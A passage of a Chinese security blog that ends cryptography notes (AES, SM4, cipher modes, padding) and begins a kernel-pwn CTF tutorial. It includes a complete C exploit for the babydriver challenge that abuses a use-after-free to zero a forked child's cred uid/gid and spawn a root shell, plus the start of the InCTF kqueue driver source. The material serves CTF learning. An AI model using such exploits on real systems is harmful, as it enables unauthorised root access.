</ul>
<p>三重DES的工作方式：</p>
<ul>
<li>DES-EEE3：三个不同密钥三次加密</li>
<li>DES-EDE3：三个不同密钥加密-解密-加密</li>
<li>DES-EEE2：两个不同密钥，K<del>1</del>&#x3D;K<del>3</del>，加密3次</li>
<li>DES-EDE2：两个不同密钥，K<del>1</del>&#x3D;K<del>3</del>，加密-解密-加密</li>
</ul>
<h2 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h2><ul>
<li><p>比三重DES快</p>
</li>
<li><p>至少与三重DES一样安全</p>
</li>
<li><p>数据分组长度为128比特</p>
</li>
<li><p>密钥长度为128&#x2F;192&#x2F;256比特</p>
</li>
<li><p>可在全世界范围内免费得到</p>
</li>
<li><p>采用SPN结构，加密和解密相似</p>
</li>
<li><p>能够有效抵抗所有已知攻击</p>
</li>
<li><p>没有发现弱密钥和补密钥</p>
</li>
<li><p>结构简单，运算速度快</p>
</li>
<li><p>支持128位分组，支持128&#x2F;192&#x2F;256位密钥</p>
</li>
<li><p>轮数Nr依赖密钥长度，分别为10&#x2F;12&#x2F;14</p>
</li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/27aec398f87c46779a71e48e0ca9722c.jpeg"><br><img src="https://img-blog.csdnimg.cn/9d64d47dcc8b482d8f123daf17e27c27.jpeg"><br><img src="https://img-blog.csdnimg.cn/890bc255ef6943d080a4f7a54ac90c05.jpeg"></p>
<h3 id="字节代换"><a href="#字节代换" class="headerlink" title="字节代换"></a>字节代换</h3><p>AES的S盒代换是基于有限域$\mathbb F_{2^8}&#x3D;\mathbb Z_2[x]&#x2F;(x^8+x^4+x^3+x+1)$<br>$a&#x3D;a_7a_6a_5a_4a_3a_2a_1a_0$<br>$$\sum_{i&#x3D;0}^7a_ix^i$$<br>字节代换：$y&#x3D;Ax^{-1}+c$<br>$$A&#x3D;\begin{pmatrix}<br>1 &amp; 1 &amp; 1 &amp; 1 &amp; 1 &amp; 0 &amp; 0 &amp; 0\<br>0 &amp; 1 &amp; 1 &amp; 1 &amp; 1 &amp; 1 &amp; 0 &amp; 0\<br>0 &amp; 0 &amp; 1 &amp; 1 &amp; 1 &amp; 1 &amp; 1 &amp; 0\<br>0 &amp; 0 &amp; 0 &amp; 1 &amp; 1 &amp; 1 &amp; 1 &amp; 1\<br>1 &amp; 0 &amp; 0 &amp; 0 &amp; 1 &amp; 1 &amp; 1 &amp; 1\<br>1 &amp; 1 &amp; 0 &amp; 0 &amp; 0 &amp; 1 &amp; 1 &amp; 1\<br>1 &amp; 1 &amp; 1 &amp; 0 &amp; 0 &amp; 0 &amp; 1 &amp; 1\<br>1 &amp; 1 &amp; 1 &amp; 1 &amp; 0 &amp; 0 &amp; 0 &amp; 1<br>\end{pmatrix},<br>c&#x3D;\begin{pmatrix}0\1\1\0\0\0\1\1\end{pmatrix}$$<br>计算z&#x3D;f(x)在有限域下的乘法逆元z^-1^，使用辗转相除法计算。</p>
<h3 id="行移位变换"><a href="#行移位变换" class="headerlink" title="行移位变换"></a>行移位变换</h3><p>对状态矩阵每一行进行循环左移操作，第i行循环左移i-1个字节。（明文看做4*4字节的矩阵）<br><img src="https://img-blog.csdnimg.cn/a1cc7c9a1f544ad59ec7e7e74123180e.jpeg"></p>
<h3 id="列混合变换"><a href="#列混合变换" class="headerlink" title="列混合变换"></a>列混合变换</h3><p><img src="https://img-blog.csdnimg.cn/360321adf66a4da59f045ee093e2a336.jpeg"><br>也就是和一个固定的矩阵相乘。</p>
<h3 id="与轮密钥异或"><a href="#与轮密钥异或" class="headerlink" title="与轮密钥异或"></a>与轮密钥异或</h3><p>与K<del>Nr</del>异或即可。</p>
<h3 id="AES密钥编排算法"><a href="#AES密钥编排算法" class="headerlink" title="AES密钥编排算法"></a>AES密钥编排算法</h3><p>若密钥长度为128字节，一共迭代10轮，需要11个轮密钥，每一个轮密钥为128位，密钥编排算法需要用128位主密钥key生成11个128位的轮密钥。<br>将4*4密钥矩阵中的每一列当做一个字，易知密钥编排算法需要输出44个字，表示11个轮密钥，AES密钥编排算法使用了S盒变换（与DES不同）</p>
<p>首先定义了10个常数：<br><img src="https://img-blog.csdnimg.cn/a3d376eeced84c65990b8a46f8f4ce1e.jpeg"><br>初始密钥有4个字W<del>[0]</del>，W<del>[1]</del>，W<del>[2]</del>，W<del>[3]</del>，为第一次派生得来。之后的字的生成方式为：对于W<del>[i]</del>，由于W<del>[3]</del>&#x3D;(K<del>12</del>，K<del>13</del>，K<del>14</del>，K<del>15</del>)^T^，此时i&#x3D;4，首先将第一字节与第四字节交换(K<del>15</del>，K<del>12</del>，K<del>13</del>，K<del>14</del>)^T^，然后逐字节进行<strong>代换</strong>。最后如果i整除4，就与上面的10个常数之一Rcon[i&#x2F;4]异或（实际上只改了最高字节）。最后再与W<del>[4-4]</del>进行<strong>异或</strong>。一直计算到W<del>[43]</del>完成。<br>当列数不同时（密钥长度为192和256比特）时，代换与异或的判断条件有所改变。</p>
<h2 id="SM4加密算法"><a href="#SM4加密算法" class="headerlink" title="SM4加密算法"></a>SM4加密算法</h2><ul>
<li>分组长度为128比特，密钥为128比特</li>
<li>是对称加密算法，共需要32轮迭代，在解密算法中密钥逆序使用</li>
<li>密钥扩展算法采用32轮迭代结构，与加密算法类似</li>
<li>基于非均衡Feistel结构</li>
</ul>
<p>每一轮迭代，产生32位新的比特序列，放在128位的最后面，前面的128位保留后96位放在前面，舍弃最前面的32位，类似于一个内部迭代过程。最后经过反序变换输出密文。<br>$x_4&#x3D;x_0\oplus T(x_1\oplus x_2\oplus x_3\oplus rk_0)$<br><img src="https://img-blog.csdnimg.cn/4339c764b4104e5985e6de3b1c850395.jpeg"><br><img src="https://img-blog.csdnimg.cn/4c80370abc4b454780a2a69952413650.jpeg"></p>
<h1 id="分组密码的工作模式"><a href="#分组密码的工作模式" class="headerlink" title="分组密码的工作模式"></a>分组密码的工作模式</h1><p>由基本密码、一些反馈和一些简单运算组合而成<br>每个密码标准在描述密码算法同时都定义相关工作模式</p>
<ul>
<li>电子密码本 ECB</li>
<li>密码分组链接 CBC</li>
<li>密码反馈 CFB</li>
<li>输出反馈 OFB</li>
<li>计数器模式 CTR</li>
</ul>
<h2 id="电子密码本模式——ECB"><a href="#电子密码本模式——ECB" class="headerlink" title="电子密码本模式——ECB"></a>电子密码本模式——ECB</h2><p>使用相同的密钥对每一块进行加密，对每一块加密后将每一块密文组合在一起即得到密文。<br><strong>分组之间没有任何关系</strong></p>
<p>优点：</p>
<ul>
<li>可以进行并行处理</li>
<li>简单有效</li>
<li>不存在错误传播问题。（加密产生的错误只会限制在一块之中）</li>
</ul>
<p>缺点：</p>
<ul>
<li>相同明文分组会加密成相同密文分组</li>
<li>对明文的主动攻击是可能的：可能会替换、重排、删除、重放信息块而改变原有明文的意义</li>
<li>适合传输短信息（如加密口令）</li>
</ul>
<h2 id="密码分组链接模式——CBC"><a href="#密码分组链接模式——CBC" class="headerlink" title="密码分组链接模式——CBC"></a>密码分组链接模式——CBC</h2><p>前一块明文的加密结果参与下一块的密文生成流程，看上去像是有链接关系。<br>分块之间相互影响：</p>
<ul>
<li>信息块不容易被替换、重排、删除、重放</li>
<li>安全性好于ECB</li>
<li>适合传输长度大于64位的报文</li>
<li>是大多数系统的标准模式（SSL、IPSec等）</li>
</ul>
<p>不足：</p>
<ul>
<li>没有已知的并行算法</li>
<li>需要共同初始化向量IV</li>
<li>存在错误传播现象，前面出错后面就全错了</li>
</ul>
<h2 id="密码反馈模式——CFB"><a href="#密码反馈模式——CFB" class="headerlink" title="密码反馈模式——CFB"></a>密码反馈模式——CFB</h2><p>将分组密码用于异步序列密码，数据可以在比分组小得多的单元里进行加密。<br>适用于实时加密字节级别的数据的情况<br><img src="https://img-blog.csdnimg.cn/ca9c5fefe47740fdaed1523531a0cba4.jpeg"><br>$$C_0&#x3D;IV（初始向量）\<br>C_1&#x3D;E_k(C_0)\oplus P_1\<br>C_{i+1}&#x3D;E_k(C_i)\oplus P_i\<br>P_1&#x3D;C_1\oplus E_k(C_0)\<br>P_i&#x3D;C_{i+1}\oplus E_k(C_i)$$</p>
<p>特点：</p>
<ul>
<li>没有已知的并行实现算法</li>
<li>隐藏的明文模式</li>
<li>需要共同的移位寄存器初始值IV</li>
<li>存在错误传播（一个单元损坏影响多个单元）</li>
</ul>
<h2 id="输出反馈模式——OFB"><a href="#输出反馈模式——OFB" class="headerlink" title="输出反馈模式——OFB"></a>输出反馈模式——OFB</h2><p>将分组密码算法用于同步序列密码的方式<br>与CFB类似，不同的是进入移位寄存器的数据<strong>和被加密明文无关</strong>，只与初始向量无关。</p>
<p><img src="https://img-blog.csdnimg.cn/eaed5b32573143169d3984f540734774.jpeg"></p>
<p>特点：</p>
<ul>
<li>没有已知的并行实现算法</li>
<li>需要共同的移位寄存器初始值IV</li>
<li>不存在错误传播</li>
<li>可以离线工作（离线生成密钥流，在线直接进行加密工作即可，相当于预处理过程）</li>
<li>密钥序列最终会重复</li>
</ul>
<h2 id="计数器模式——CTR"><a href="#计数器模式——CTR" class="headerlink" title="计数器模式——CTR"></a>计数器模式——CTR</h2><p>引入一个计数器，使用密钥加密计数器的值，然后与明文异或。下一次加密将计数器加一相同操作。</p>
<ul>
<li>可以进行并行加密</li>
<li>可以离线工作（预处理）</li>
<li>吞吐量仅受可使用并行数量的限制</li>
<li>加密数据块的随机访问</li>
<li>可证明安全</li>
<li>简单性（只要求实现加密算法）</li>
<li>密钥只能使用一次，除非能维持很长的计数器</li>
</ul>
<h1 id="短块处理"><a href="#短块处理" class="headerlink" title="短块处理"></a>短块处理</h1><p>通用方法：填充（padding）（当明文长度为分组长度的整数倍时，仍然需要添加一整个填充块）</p>
<ul>
<li><p>pkcs#5&#x2F;pkcs#7：最大分组长度为不小于8&#x2F;256字节，缺失几个字节填充几遍填充字节数量</p>
</li>
<li><p>PKCS7填充法：FF FF FF FF FF FF FF FF FF 07 07 07 07 07 07 07</p>
</li>
<li><p>X923填充法：FF FF FF FF FF FF FF FF FF 00 00 00 00 00 00 07</p>
</li>
<li><p>ISO 10126填充：FF FF FF FF FF FF FF FF FF 7D 2A 75 EF F8 EF 07</p>
</li>
<li><p>一种特殊方法</p>
</li>
<li><p>自主指定，None，Zeros</p>
</li>
<li><p>避免使用padding造成数据长度的扩充CTS（CipherText Stealing，密文挪用）</p>
</li>
<li><p>工作模式安全性依赖于算法本身的安全性</p>
</li>
<li><p>常用工作模式的比较：分组密码算法的作用、随机数的不可预测性、计数器的新鲜性、并行性、错误传播</p>
</li>
<li><p>短块处理：填充、密文挪用</p>
</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/Kernel-Pwn-%E5%85%A5%E9%97%A8-4/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's Pwnhome">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/Kernel-Pwn-%E5%85%A5%E9%97%A8-4/" class="post-title-link" itemprop="url">Kernel Pwn 入门 (4)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-02-28 22:28:08 / Modified: 22:54:19" itemprop="dateCreated datePublished" datetime="2023-02-28T22:28:08+08:00">2023-02-28</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/kernel-pwn-%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">kernel pwn 系列</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="babydriver-的本来解法"><a class="markdownIt-Anchor" href="#babydriver-的本来解法"></a> babydriver 的本来解法</h1>
<blockquote>
<p>摘自<a target="_blank" rel="noopener" href="https://arttnba3.cn/2021/03/03/NOTE-0X03-LINUX-KERNEL-PWN-PART-II/">资料</a><br />
这道题在当年的解法据悉是通过 UAF 修改该进程的 cred 结构体的 uid、gid 为0，十分简单十分白给<br />
但是此种方法在较新版本 kernel 中已不可行，我们已无法直接分配到 cred_jar 中的 object，这是因为 cred_jar 在创建时设置了 SLAB_ACCOUNT 标记，不会再与相同大小的 kmalloc-192 进行合并</p>
</blockquote>
<p>为深入理解，笔者决定还是进行一番研究。<br />
原来的利用思路中也包含了UAF，其意在通过UAF直接修改cred结构体，将uid和gid直接改为0。<br />
下面是4.4.72版本中cred结构体的声明：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">	<span class="type">atomic_t</span>	usage;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">	<span class="type">atomic_t</span>	subscribers;	<span class="comment">/* number of processes subscribed */</span></span><br><span class="line">	<span class="type">void</span>		*put_addr;</span><br><span class="line">	<span class="type">unsigned</span>	magic;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC	0x43736564</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC_DEAD	0x44656144</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="type">kuid_t</span>		uid;		<span class="comment">/* real UID of the task */</span></span><br><span class="line">	<span class="type">kgid_t</span>		gid;		<span class="comment">/* real GID of the task */</span></span><br><span class="line">	<span class="type">kuid_t</span>		suid;		<span class="comment">/* saved UID of the task */</span></span><br><span class="line">	<span class="type">kgid_t</span>		sgid;		<span class="comment">/* saved GID of the task */</span></span><br><span class="line">	<span class="type">kuid_t</span>		euid;		<span class="comment">/* effective UID of the task */</span></span><br><span class="line">	<span class="type">kgid_t</span>		egid;		<span class="comment">/* effective GID of the task */</span></span><br><span class="line">	<span class="type">kuid_t</span>		fsuid;		<span class="comment">/* UID for VFS ops */</span></span><br><span class="line">	<span class="type">kgid_t</span>		fsgid;		<span class="comment">/* GID for VFS ops */</span></span><br><span class="line">	<span class="type">unsigned</span>	securebits;	<span class="comment">/* SUID-less security management */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_permitted;	<span class="comment">/* caps we&#x27;re permitted */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_effective;	<span class="comment">/* caps we can actually use */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_bset;	<span class="comment">/* capability bounding set */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_ambient;	<span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span>	jit_keyring;	<span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment">					 * keys to */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span> __<span class="title">rcu</span> *<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">process_keyring</span>;</span> <span class="comment">/* keyring private to this process */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">thread_keyring</span>;</span> <span class="comment">/* keyring private to this thread */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">request_key_auth</span>;</span> <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">	<span class="type">void</span>		*security;	<span class="comment">/* subjective LSM security */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span>	<span class="comment">/* real user ID subscription */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span> <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span>	<span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span>	<span class="title">rcu</span>;</span>		<span class="comment">/* RCU deletion hook */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>同样是两次打开设备，这里使用了fork函数产生了一个子进程，利用打开的设备修改子进程的cred结构体。至于为什么这里要使用fork函数，就需要了解一下fork函数的工作原理了。</p>
<blockquote>
<p>fork（）会产生一个和父进程完全相同的子进程，但子进程在此后多会exec系统调用，出于效率考虑，linux中引入了“写时复制“技术，也就是只有进程空间的各段的内容要发生变化时，才会将父进程的内容复制一份给子进程。在fork之后exec之前两个进程用的是相同的物理空间（内存区），子进程的代码段、数据段、堆栈都是指向父进程的物理空间，也就是说，两者的虚拟空间不同，但其对应的物理空间是同一个。当父子进程中有更改相应段的行为发生时，再为子进程相应的段分配物理空间，如果不是因为exec，内核会给子进程的数据段、堆栈段分配相应的物理空间（至此两者有各自的进程空间，互不影响），而代码段继续共享父进程的物理空间（两者的代码完全相同）。而如果是因为exec，由于两者执行的代码不同，子进程的代码段也会分配单独的物理空间。<br />
————————————————<br />
版权声明：本文为CSDN博主「狂奔的乌龟」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br />
原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/xy010902100449/article/details/44851453">https://blog.csdn.net/xy010902100449/article/details/44851453</a></p>
</blockquote>
<p>当我们fork出一个子进程时，子进程的cred结构体指针与父进程的指针值是一样的，但实际指向的物理地址已经发生了改变。如果我们事先将buf的大小改为cred结构体的大小，那么在fork出子进程时，内核就会将子进程的cred结构体分配到buf的位置，我们也就能够对其进行随意修改。不过笔者尚未找到一种快捷的计算cred、tty_operations等这类结构体的大小，只能一个类型一个类型向前找定义。若读者有更好的方法，还请不吝赐教。</p>
<p>exp：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="type">int</span> f1 = open(<span class="string">&quot;/dev/babydev&quot;</span>, <span class="number">2</span>);</span><br><span class="line">	<span class="type">int</span> f2 = open(<span class="string">&quot;/dev/babydev&quot;</span>, <span class="number">2</span>);</span><br><span class="line">	</span><br><span class="line">	ioctl(f1, <span class="number">0x10001</span>, <span class="number">0xa8</span>);</span><br><span class="line">	close(f1);</span><br><span class="line">	</span><br><span class="line">	<span class="type">int</span> pid = fork();</span><br><span class="line">	<span class="keyword">if</span>(pid == <span class="number">0</span>)&#123;</span><br><span class="line">		<span class="type">char</span> buf[<span class="number">28</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">		write(f2, buf, <span class="number">28</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] The uid now is: %d.\033[0m\n&quot;</span>, getuid());</span><br><span class="line">		system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span> <span class="keyword">if</span>(pid &lt; <span class="number">0</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error: Failed to get root, exiting......\033[0m\n&quot;</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		wait(<span class="literal">NULL</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注意：<strong>这里的wait(NULL)不可缺少</strong>，因为子进程不允许没有父进程存在，在子进程执行system时需要让父进程阻塞。如果没有这条语句，程序将会直接退出，子进程将会称为孤儿进程：</p>
<blockquote>
<p>（摘自<a target="_blank" rel="noopener" href="https://blog.csdn.net/tennysonsky/article/details/45969569?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165136928416781432992726%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=165136928416781432992726&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-45969569.142%5Ev9%5Econtrol,157%5Ev4%5Econtrol&amp;utm_term=linux+%E5%AD%A4%E5%84%BF%E8%BF%9B%E7%A8%8B&amp;spm=1018.2226.3001.4187">资料</a>）<br />
孤儿进程是没有父进程的进程，为避免孤儿进程退出时无法释放所占用的资源而变为僵尸进程（什么是僵尸进程，请看<a target="_blank" rel="noopener" href="https://blog.csdn.net/tennysonsky/article/details/45966571">《特殊进程之僵尸进程》</a>），进程号为 1 的 init 进程将会接受这些孤儿进程，这一过程也被称为“收养”。init 进程就好像是一个孤儿院，专门负责处理孤儿进程的善后工作。每当出现一个孤儿进程的时候，内核就把孤 儿进程的父进程设置为 init ，而 init 进程会循环地 wait() 它的已经退出的子进程。这样，当一个孤儿进程凄凉地结束了其生命周期的时候，init 进程就会代表党和政府出面处理它的一切善后工作。因此孤儿进程并不会有什么危害。</p>
</blockquote>
<p>父进程结束后，我们实际上就失去了对子进程的控制，这样即使子进程成功执行的system函数，我们也无法获取到root权限，因为此时父进程已经结束，我们现在直接控制的是1号进程，也就是系统进程，而系统进程中我们的权限仍然是受限的。</p>
<h1 id="heap-overflow"><a class="markdownIt-Anchor" href="#heap-overflow"></a> Heap Overflow</h1>
<p>说到内核的堆溢出，就不能不了解内核分配堆空间内存的方式。在kernel pwn题目中，内核堆空间分配最为常用的函数就是kmalloc函数了，与用户态的malloc函数相似，其也是传入一个需要申请的大小，返回申请到的地址值，但在kmalloc的底层则是slab/slub系统和伙伴系统的协调合作。这里介绍一下最为简单的伙伴系统，slab系统择日再进行详细分析。</p>
<h2 id="伙伴系统buddy-system"><a class="markdownIt-Anchor" href="#伙伴系统buddy-system"></a> 伙伴系统（Buddy System）</h2>
<p>伙伴系统用于管理以页为最小单位的内存空间，能够在一定程度上减少内存空间中的碎片。其维护需要一组链表，每一个链表中保存大小相同的连续内存块，这些内存块的大小为一页的2次幂。且所有内存块的起始地址必须是内存块自身大小的整数倍。<br />
<img src="https://img-blog.csdnimg.cn/a570d91393664fe38c1d7d6718f7f2a4.png" alt="" /><br />
<img src="https://img-blog.csdnimg.cn/7f6e4311b56b4d6a9c026760f2d85b1b.png" alt="" /><br />
如上图所示，每一个小的正方形都表示一页，用红线划去的是不允许出现在伙伴系统中的块。上面的两个不允许出现的块都是因为其起始地址不能被自身大小所整除。</p>
<p>当需要分配2<sup>n</sup>个页大小的连续空间时，去链表组中检查保存2<sup>n</sup>页大小空间的链表中是否有块存在，如果存在则分配，若没有则查找2<sup>n+1</sup>的块是否存在，以此类推。</p>
<p><img src="https://img-blog.csdnimg.cn/a1571c106546445db3b5db47f3c7878e.png" alt="" /><br />
如上图中需要分配2页的连续空间，首先查找是否有2页的空闲空间块，发现没有，于是查找是否有4页的空闲空间块，还是没有，但是8页的空闲块有，于是分隔这个块，分割结果为：<br />
<img src="https://img-blog.csdnimg.cn/8a99307e06af42d2b3664ed4d3121baf.png" alt="" /><br />
这就是伙伴算法，伙伴系统就是基于伙伴算法实现的，整体上还是比较容易理解的。</p>
<h2 id="例题inctf-kqueue"><a class="markdownIt-Anchor" href="#例题inctf-kqueue"></a> 例题：InCTF-Kqueue</h2>
<p>这道题给出了源码，我们可以首先阅读源码来分析整个驱动详细的执行流程。（登入用户名ctf、密码kqueue）</p>
<p>这个驱动只提供了一个接口：ioctl，有四个指令码，分别对应增删改查。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> CREATE_KQUEUE 0xDEADC0DE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EDIT_KQUEUE   0xDAADEEEE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DELETE_KQUEUE 0xBADDCAFE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SAVE          0xB105BABE</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> noinline <span class="type">long</span> <span class="title function_">kqueue_ioctl</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">long</span> result;</span><br><span class="line"></span><br><span class="line">    <span class="type">request_t</span> request;</span><br><span class="line">    </span><br><span class="line">    mutex_lock(&amp;operations_lock);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (copy_from_user((<span class="type">void</span> *)&amp;request, (<span class="type">void</span> *)arg, <span class="keyword">sizeof</span>(<span class="type">request_t</span>)))&#123;</span><br><span class="line">        err(<span class="string">&quot;[-] copy_from_user failed&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span>(cmd)&#123;</span><br><span class="line">        <span class="keyword">case</span> CREATE_KQUEUE:</span><br><span class="line">            result = create_kqueue(request);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> 